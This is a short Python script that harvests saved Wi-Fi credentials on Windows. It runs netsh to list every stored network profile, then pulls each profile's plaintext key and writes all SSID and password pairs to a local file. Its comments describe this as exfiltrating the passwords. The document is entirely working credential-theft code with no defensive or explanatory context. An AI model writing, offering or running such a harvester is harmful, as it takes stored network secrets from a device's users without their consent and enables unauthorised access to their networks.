import subprocess

# Prints out all the saved SSID names
# Then iterates through each SSID and have it run the netsh command
# Exfiltrate the password and format it where it prints out the SSID and passwd into a .txt file

SSID_List = subprocess.run("netsh wlan show profile", capture_output=True, text=True)
SSIDs = SSID_List.stdout
ByLine = SSIDs.splitlines()

Clean_SSIDs = []

for line in ByLine:
    if "All User Profile" in line:
        parts = line.split(":")
        ssid = parts[1].strip()
        Clean_SSIDs.append(ssid)

ssid_passwords = []
for ssid in Clean_SSIDs:
    result = subprocess.run(
        f'netsh wlan show profile name="{ssid}" key=clear',
        capture_output=True,
        text=True
    )
    lines = result.stdout.splitlines()
    
    password = "(none)"  # default if network is open
    for line in lines:
        if "Key Content" in line:
            password = line.split(":", 1)[1].strip()
            break
    
    ssid_passwords.append((ssid, password))

with open("PassList.txt", "w") as Passlist:
    Passlist.write("==========| SSIDs (Network Names) stored on Device: |==========\n")
    for ssid in Clean_SSIDs:
        Passlist.write(ssid + '\n')

    Passlist.write("\n==========| SSID : Passwords |==========\n")
    for ssid, password in ssid_passwords:
        Passlist.write(f"{ssid} : {password}\n")


